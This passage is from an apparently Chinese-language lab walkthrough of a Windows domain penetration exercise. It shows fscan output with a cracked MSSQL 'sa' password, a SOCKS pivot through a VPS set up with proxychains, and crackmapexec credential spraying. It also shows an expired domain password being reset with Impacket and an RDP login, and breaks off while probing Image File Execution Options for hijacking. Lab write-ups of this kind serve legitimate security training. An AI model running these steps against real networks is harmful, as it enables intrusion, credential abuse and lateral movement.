+</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span><span class=nb>cd</span> users
+</span></span><span class=line><span class=cl><span class=nb>cd</span> users
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers&gt;cd public
+</span></span><span class=line><span class=cl><span class=nb>cd</span> public
+</span></span></code></pre></div><p><strong>在这里有两步操作</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>admin<span class=o>)</span> &gt;&gt; use <span class=m>0</span> 
+</span></span><span class=line><span class=cl><span class=o>(</span>node 0<span class=o>)</span> &gt;&gt; socks <span class=m>1123</span>
+</span></span></code></pre></div><p>这个操作是为了后面kali虚拟机可以通过设置socks5代理，进行密码喷溅攻击的前提</p><p>进行扫描</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\P</span>ublic&gt;fscan.exe -h 172.22.8.18/24
+</span></span><span class=line><span class=cl>fscan.exe -h 172.22.8.18/24
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _    
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __ 
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;    
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\ </span>  
+</span></span><span class=line><span class=cl>                     fscan version: 1.8.3
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.8.18     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.8.15     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.8.31     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.8.46     is alive
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Icmp alive hosts len is: <span class=m>4</span>
+</span></span><span class=line><span class=cl>172.22.8.18:80 open
+</span></span><span class=line><span class=cl>172.22.8.15:88 open
+</span></span><span class=line><span class=cl>172.22.8.46:445 open
+</span></span><span class=line><span class=cl>172.22.8.31:445 open
+</span></span><span class=line><span class=cl>172.22.8.18:1433 open
+</span></span><span class=line><span class=cl>172.22.8.15:445 open
+</span></span><span class=line><span class=cl>172.22.8.18:445 open
+</span></span><span class=line><span class=cl>172.22.8.46:139 open
+</span></span><span class=line><span class=cl>172.22.8.31:139 open
+</span></span><span class=line><span class=cl>172.22.8.15:139 open
+</span></span><span class=line><span class=cl>172.22.8.15:135 open
+</span></span><span class=line><span class=cl>172.22.8.31:135 open
+</span></span><span class=line><span class=cl>172.22.8.46:135 open
+</span></span><span class=line><span class=cl>172.22.8.18:139 open
+</span></span><span class=line><span class=cl>172.22.8.18:135 open
+</span></span><span class=line><span class=cl>172.22.8.46:80 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>16</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.8.18
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN-WEB
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.8.18
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>2001:0:348b:fb58:3c69:3380:d89c:6478
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.8.46
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN2016
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.8.46
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.8.15
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>DC01
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.8.15
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.8.15     <span class=o>[</span>+<span class=o>]</span> DC:XIAORANG<span class=se>\D</span>C01           
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.8.31
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN19-CLIENT
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.8.31
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.8.31     XIAORANG<span class=se>\W</span>IN19-CLIENT         
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> mssql 172.22.8.18:1433:sa 1qaz!QAZ
+</span></span><span class=line><span class=cl>已完成 16/16
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 扫描结束,耗时: 10.0476419s
+</span></span></code></pre></div><p>可以看到一共有四台机子，网段内是18，15，31，46<br>18这台mssql服务的机子已经被我们拿下了，接下来就是要去找域相关的机子，因为前面得到了域相关的账号密码<br>从扫描结果来看，我们前面得到的账号和密码是要用于攻击.46这台机器的</p><h3 id=kali进行密码喷涂>kali进行密码喷涂</h3><p>这里需要我们设置代理</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# cat /etc/proxychains4.conf                                               
+</span></span><span class=line><span class=cl><span class=c1># proxychains.conf  VER 4.x</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The option below identifies how the ProxyList is treated.</span>
+</span></span><span class=line><span class=cl><span class=c1># only one option should be uncommented at time,</span>
+</span></span><span class=line><span class=cl><span class=c1># otherwise the last appearing option will be accepted</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#dynamic_chain</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Dynamic - Each connection will be done via chained proxies</span>
+</span></span><span class=line><span class=cl><span class=c1># all proxies chained in the order as they appear in the list</span>
+</span></span><span class=line><span class=cl><span class=c1># at least one proxy must be online to play in chain</span>
+</span></span><span class=line><span class=cl><span class=c1># (dead proxies are skipped)</span>
+</span></span><span class=line><span class=cl><span class=c1># otherwise EINTR is returned to the app</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>strict_chain
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Strict - Each connection will be done via chained proxies</span>
+</span></span><span class=line><span class=cl><span class=c1># all proxies chained in the order as they appear in the list</span>
+</span></span><span class=line><span class=cl><span class=c1># all proxies must be online to play in chain</span>
+</span></span><span class=line><span class=cl><span class=c1># otherwise EINTR is returned to the app</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#round_robin_chain</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Round Robin - Each connection will be done via chained proxies</span>
+</span></span><span class=line><span class=cl><span class=c1># of chain_len length</span>
+</span></span><span class=line><span class=cl><span class=c1># all proxies chained in the order as they appear in the list</span>
+</span></span><span class=line><span class=cl><span class=c1># at least one proxy must be online to play in chain</span>
+</span></span><span class=line><span class=cl><span class=c1># (dead proxies are skipped).</span>
+</span></span><span class=line><span class=cl><span class=c1># the start of the current proxy chain is the proxy after the last</span>
+</span></span><span class=line><span class=cl><span class=c1># proxy in the previously invoked proxy chain.</span>
+</span></span><span class=line><span class=cl><span class=c1># if the end of the proxy chain is reached while looking for proxies</span>
+</span></span><span class=line><span class=cl><span class=c1># start at the beginning again.</span>
+</span></span><span class=line><span class=cl><span class=c1># otherwise EINTR is returned to the app</span>
+</span></span><span class=line><span class=cl><span class=c1># These semantics are not guaranteed in a multithreaded environment.</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#random_chain</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Random - Each connection will be done via random proxy</span>
+</span></span><span class=line><span class=cl><span class=c1># (or proxy chain, see  chain_len) from the list.</span>
+</span></span><span class=line><span class=cl><span class=c1># this option is good to test your IDS :)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Make sense only if random_chain or round_robin_chain</span>
+</span></span><span class=line><span class=cl><span class=c1>#chain_len = 2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Quiet mode (no output from library)</span>
+</span></span><span class=line><span class=cl><span class=c1>#quiet_mode</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Proxy DNS requests - no leak for DNS data</span>
+</span></span><span class=line><span class=cl><span class=c1># (disable all of the 3 items below to not proxy your DNS requests)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># method 1. this uses the proxychains4 style method to do remote dns:</span>
+</span></span><span class=line><span class=cl><span class=c1># a thread is spawned that serves DNS requests and hands down an ip</span>
+</span></span><span class=line><span class=cl><span class=c1># assigned from an internal list (via remote_dns_subnet).</span>
+</span></span><span class=line><span class=cl><span class=c1># this is the easiest (setup-wise) and fastest method, however on</span>
+</span></span><span class=line><span class=cl><span class=c1># systems with buggy libcs and very complex software like webbrowsers</span>
+</span></span><span class=line><span class=cl><span class=c1># this might not work and/or cause crashes.</span>
+</span></span><span class=line><span class=cl>proxy_dns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># method 2. use the old proxyresolv script to proxy DNS requests</span>
+</span></span><span class=line><span class=cl><span class=c1># in proxychains 3.1 style. requires `proxyresolv` in $PATH</span>
+</span></span><span class=line><span class=cl><span class=c1># plus a dynamically linked `dig` binary.</span>
+</span></span><span class=line><span class=cl><span class=c1># this is a lot slower than `proxy_dns`, doesn&#39;t support .onion URLs,</span>
+</span></span><span class=line><span class=cl><span class=c1># but might be more compatible with complex software like webbrowsers.</span>
+</span></span><span class=line><span class=cl><span class=c1>#proxy_dns_old</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># method 3. use proxychains4-daemon process to serve remote DNS requests.</span>
+</span></span><span class=line><span class=cl><span class=c1># this is similar to the threaded `proxy_dns` method, however it requires</span>
+</span></span><span class=line><span class=cl><span class=c1># that proxychains4-daemon is already running on the specified address.</span>
+</span></span><span class=line><span class=cl><span class=c1># on the plus side it doesn&#39;t do malloc/threads so it should be quite</span>
+</span></span><span class=line><span class=cl><span class=c1># compatible with complex, async-unsafe software.</span>
+</span></span><span class=line><span class=cl><span class=c1># note that if you don&#39;t start proxychains4-daemon before using this,</span>
+</span></span><span class=line><span class=cl><span class=c1># the process will simply hang.</span>
+</span></span><span class=line><span class=cl><span class=c1>#proxy_dns_daemon 127.0.0.1:1053</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># set the class A subnet number to use for the internal remote DNS mapping</span>
+</span></span><span class=line><span class=cl><span class=c1># we use the reserved 224.x.x.x range by default,</span>
+</span></span><span class=line><span class=cl><span class=c1># if the proxified app does a DNS request, we will return an IP from that range.</span>
+</span></span><span class=line><span class=cl><span class=c1># on further accesses to this ip we will send the saved DNS name to the proxy.</span>
+</span></span><span class=line><span class=cl><span class=c1># in case some control-freak app checks the returned ip, and denies to </span>
+</span></span><span class=line><span class=cl><span class=c1># connect, you can use another subnet, e.g. 10.x.x.x or 127.x.x.x.</span>
+</span></span><span class=line><span class=cl><span class=c1># of course you should make sure that the proxified app does not need</span>
+</span></span><span class=line><span class=cl><span class=c1># *real* access to this subnet. </span>
+</span></span><span class=line><span class=cl><span class=c1># i.e. dont use the same subnet then in the localnet section</span>
+</span></span><span class=line><span class=cl><span class=c1>#remote_dns_subnet 127 </span>
+</span></span><span class=line><span class=cl><span class=c1>#remote_dns_subnet 10</span>
+</span></span><span class=line><span class=cl>remote_dns_subnet <span class=m>224</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Some timeouts in milliseconds</span>
+</span></span><span class=line><span class=cl>tcp_read_time_out <span class=m>15000</span>
+</span></span><span class=line><span class=cl>tcp_connect_time_out <span class=m>8000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>### Examples for localnet exclusion</span>
+</span></span><span class=line><span class=cl><span class=c1>## localnet ranges will *not* use a proxy to connect.</span>
+</span></span><span class=line><span class=cl><span class=c1>## note that localnet works only when plain IP addresses are passed to the app,</span>
+</span></span><span class=line><span class=cl><span class=c1>## the hostname resolves via /etc/hosts, or proxy_dns is disabled or proxy_dns_old used.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Exclude connections to 192.168.1.0/24 with port 80</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet 192.168.1.0:80/255.255.255.0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Exclude connections to 192.168.100.0/24</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet 192.168.100.0/255.255.255.0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Exclude connections to ANYwhere with port 80</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet 0.0.0.0:80/0.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet [::]:80/0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## RFC6890 Loopback address range</span>
+</span></span><span class=line><span class=cl><span class=c1>## if you enable this, you have to make sure remote_dns_subnet is not 127</span>
+</span></span><span class=line><span class=cl><span class=c1>## you&#39;ll need to enable it if you want to use an application that </span>
+</span></span><span class=line><span class=cl><span class=c1>## connects to localhost.</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet 127.0.0.0/255.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet ::1/128</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## RFC1918 Private Address Ranges</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet 10.0.0.0/255.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet 172.16.0.0/255.240.0.0</span>
+</span></span><span class=line><span class=cl><span class=c1># localnet 192.168.0.0/255.255.0.0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>### Examples for dnat</span>
+</span></span><span class=line><span class=cl><span class=c1>## Trying to proxy connections to destinations which are dnatted,</span>
+</span></span><span class=line><span class=cl><span class=c1>## will result in proxying connections to the new given destinations.</span>
+</span></span><span class=line><span class=cl><span class=c1>## Whenever I connect to 1.1.1.1 on port 1234 actually connect to 1.1.1.2 on port 443</span>
+</span></span><span class=line><span class=cl><span class=c1># dnat 1.1.1.1:1234  1.1.1.2:443</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Whenever I connect to 1.1.1.1 on port 443 actually connect to 1.1.1.2 on port 443</span>
+</span></span><span class=line><span class=cl><span class=c1>## (no need to write :443 again)</span>
+</span></span><span class=line><span class=cl><span class=c1># dnat 1.1.1.2:443  1.1.1.2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## No matter what port I connect to on 1.1.1.1 port actually connect to 1.1.1.2 on port 443</span>
+</span></span><span class=line><span class=cl><span class=c1># dnat 1.1.1.1  1.1.1.2:443</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Always, instead of connecting to 1.1.1.1, connect to 1.1.1.2</span>
+</span></span><span class=line><span class=cl><span class=c1># dnat 1.1.1.1  1.1.1.2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># ProxyList format</span>
+</span></span><span class=line><span class=cl><span class=c1>#       type  ip  port [user pass]</span>
+</span></span><span class=line><span class=cl><span class=c1>#       (values separated by &#39;tab&#39; or &#39;blank&#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#       only numeric ipv4 addresses are valid</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#        Examples:</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#               socks5  192.168.67.78   1080    lamer   secret</span>
+</span></span><span class=line><span class=cl><span class=c1>#               http    192.168.89.3    8080    justu   hidden</span>
+</span></span><span class=line><span class=cl><span class=c1>#               socks4  192.168.1.49    1080</span>
+</span></span><span class=line><span class=cl><span class=c1>#               http    192.168.39.93   8080</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#       proxy types: http, socks4, socks5, raw</span>
+</span></span><span class=line><span class=cl><span class=c1>#         * raw: The traffic is simply forwarded to the proxy without modification.</span>
+</span></span><span class=line><span class=cl><span class=c1>#        ( auth types supported: &#34;basic&#34;-http  &#34;user/pass&#34;-socks )</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>ProxyList<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=c1># add proxy here ...</span>
+</span></span><span class=line><span class=cl><span class=c1># meanwile</span>
+</span></span><span class=line><span class=cl><span class=c1># defaults set to &#34;tor&#34;</span>
+</span></span><span class=line><span class=cl>socks5  38.55.99.185 <span class=m>1123</span>
+</span></span></code></pre></div><p>这里我们看最后一行，<br>最后一行原先应该是socks4 1227.0.0.1 9050</p><p>我们修改最后一行，用socks5设置成我们vps的地址(打靶机结束之后改回去，不要影响正常使用)，以及我们刚刚进行内网代理的时候socks开放的端口1123</p><p>这样子kali就可以经过这两层代理，攻击目标靶机</p><p>当然为了让机子强制走我设置的流量，这里还需要了解一下proxychains</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Proxychains 是一个强制应用的网络流量通过代理（如 SOCKS4, SOCKS5, HTTP/HTTPS）的工具。
+</span></span><span class=line><span class=cl>它的核心思想是：有些应用程序本身不支持通过代理服务器连接网络，Proxychains 可以“强行”让这些应用的流量走你指定的代理通道。
+</span></span><span class=line><span class=cl>工作原理
+</span></span><span class=line><span class=cl>它通过一个名为 LD_PRELOAD 的环境变量，将一个动态链接库预加载到目标应用程序的进程空间中。这个库会“劫持”应用程序的网络通信函数（如 connect），将原本要直接发往目标服务器的流量，重定向到你配置好的代理服务器上。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>主要用途
+</span></span><span class=line><span class=cl>渗透测试和红队行动：这是最常见的用途。安全研究人员通过一层或多层代理（跳板机）来隐藏自己的真实IP地址。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>访问受限网络：绕过防火墙限制，访问在直接网络中无法访问的资源。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>应用代理支持：为那些本身没有提供代理设置选项的命令行工具（如 nmap, wget, ftp，以及你刚才用的 crackmapexec）提供代理功能。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>基本使用语法
+</span></span><span class=line><span class=cl>bash
+</span></span><span class=line><span class=cl>proxychains <span class=o>[</span>选项<span class=o>]</span> &lt;要运行的程序&gt; <span class=o>[</span>程序参数<span class=o>]</span>
+</span></span><span class=line><span class=cl>最常用的选项是 -q（安静模式），它可以减少输出日志，让你更专注于目标程序本身的输出。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># /etc/proxychains4.conf 的末尾部分</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>ProxyList<span class=o>]</span>
+</span></span><span class=line><span class=cl>socks5 127.0.0.1 <span class=m>1080</span>
+</span></span><span class=line><span class=cl><span class=c1># 可以进行自定义更改</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>ProxyList<span class=o>]</span>
+</span></span><span class=line><span class=cl>socks5 192.168.1.10 <span class=m>1080</span>
+</span></span><span class=line><span class=cl>http    10.0.0.100 <span class=m>8080</span>
+</span></span><span class=line><span class=cl>socks4  218.101.10.1 <span class=m>4145</span>
+</span></span></code></pre></div><p>进行密码喷涂</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains -q crackmapexec smb 172.22.8.46 -u <span class=s1>&#39;Aldrich&#39;</span> -p <span class=s1>&#39;Ald@rLMWuy7Z!#&#39;</span>
+</span></span><span class=line><span class=cl>SMB         172.22.8.46     <span class=m>445</span>    WIN2016          <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span> x64 <span class=o>(</span>name:WIN2016<span class=o>)</span> <span class=o>(</span>domain:xiaorang.lab<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:True<span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         172.22.8.46     <span class=m>445</span>    WIN2016          <span class=o>[</span>-<span class=o>]</span> xiaorang.lab<span class=se>\A</span>ldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
+</span></span><span class=line><span class=cl>                                                                                                  
+</span></span></code></pre></div><p>发现他说密码已经过期和失效</p><p>然后利用这个脚本修改smbpasswd的密码<br><a href=https://github.com/Lex-Case/Impacket/blob/master/examples/smbpasswd.py>https://github.com/Lex-Case/Impacket/blob/master/examples/smbpasswd.py</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains python3 smbpasswd.py xiaorang.lab/Aldrich:<span class=s1>&#39;Ald@rLMWuy7Z!#&#39;</span>@172.22.8.15 -newpass <span class=s1>&#39;Admin123$%&#39;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> config file found: /etc/proxychains4.conf
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated <span class=nv>companies</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>===============================================================================</span>
+</span></span><span class=line><span class=cl>  Warning: This functionality will be deprecated in the next Impacket <span class=nv>version</span>  
+</span></span><span class=line><span class=cl><span class=o>===============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.8.15:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Password is expired, trying to <span class=nb>bind</span> with a null session.
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> Strict chain  ...  38.55.99.185:1123  ...  172.22.8.15:445  ...  OK
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Password was changed successfully.
+</span></span><span class=line><span class=cl>                                                 
+</span></span></code></pre></div><p>发现回显成功，说明密码已经修改好了，然后我们可以在物理机上尝试rdp登录上去<br><img class=article-content-image src=/image/Tsclient8.png loading=lazy decoding=async alt="alt text"><br>注意这里因为是域内用户，所以用户名前要加上域名</p><p>这里需要设置proxifier代理才能连接内网(这个自己去了解)<br><img class=article-content-image src=/image/Tsclient9.png loading=lazy decoding=async alt="alt text"></p><p>也是成功连上了</p><p>根据提示说的镜像劫持，查看注册表的Image File Execution Options</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\A</span>ldrich&gt; Get-Acl -path <span class=s2>&#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&#34;</span> <span class=p>|</span> f
+</span></span><span class=line><span class=cl>l *
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PSPath                  : Microsoft.PowerShell.Core<span class=se>\R</span>egistry::HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\M</span>icrosoft<span class=se>\W</span>indows NT<span class=se>\C</span>urrentV
+</span></span><span class=line><span class=cl>                          ersion<span class=se>\I</span>mage File Execution Options
+</span></span><span class=line><span class=cl>PSParentPath            : Microsoft.PowerShell.Core<span class=se>\R</span>egistry::HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\M</span>icrosoft<span class=se>\W</span>indows NT<span class=se>\C</span>urrentV
+</span></span><span class=line><span class=cl>                          ersion
+</span></span><span class=line><span class=cl>PSChildName             : Image File Execution Options
+</span></span><span class=line><span class=cl>PSDrive                 : HKLM
+</span></span><span class=line><span class=cl>PSProvider              : Microsoft.PowerShell.Core<span class=se>\R</span>egistry
+</span></span><span class=line><span class=cl>CentralAccessPolicyId   :
+</span></span><span class=line><span class=cl>CentralAccessPolicyName :
+</span></span><span class=line><span class=cl>Path                    : Microsoft.PowerShell.Core<span class=se>\R</span>egistry::HKEY_LOCAL_MACHINE<span class=se>\S</span>OFTWARE<span class=se>\M</span>icrosoft<span class=se>\W</span>indows NT<span class=se>\C</span>urrentV
+</span></span><span class=line><span class=cl>                          ersion<span class=se>\I</span>mage File Execution Options
+</span></span><span class=line><span class=cl>Owner                   : NT AUTHORITY<span class=se>\S</span>YSTEM
+</span></span><span class=line><span class=cl>Group                   : NT AUTHORITY<span class=se>\S</span>YSTEM
+</span></span><span class=line><span class=cl>Access                  : <span class=o>{</span>System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAcce
+</span></span><span class=line><span class=cl>                          ssRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.Regis
+</span></span><span class=line><span class=cl>                          tryAccessRule...<span class=o>}</span>
+</span></span><span class=line><span class=cl>Sddl                    : O:SYG:SYD:PAI<span class=o>(</span>A<span class=p>;</span>CIIO<span class=p>;</span>KA<span class=p>;;;</span>CO<span class=o>)(</span>A<span class=p>;</span>CI<span class=p>;</span>CCDCLCSWRPRC<span class=p>;;;</span>AU<span class=o>)(</span>A<span class=p>;</span>CI<span class=p>;</span>KA<span class=p>;;;</span>SY<span class=o>)(</span>A<span class=p>;</span>CI<span class=p>;</span>KA<span class=p>;;;</span>BA<span class=o>)(</span>A<span class=p>;</span>CI<span class=p>;</span>KR<span class=p>;;;</span>B
+</span></span><span class=line><span class=cl>                          U<span class=o>)(</span>A<span class=p>;</span>CI<span class=p>;</span>KR<span class=p>;;;</span>AC<span class=o>)</span>
+</span></span><span class=line><span class=cl>AccessToString          : CREATOR OWNER Allow  FullControl
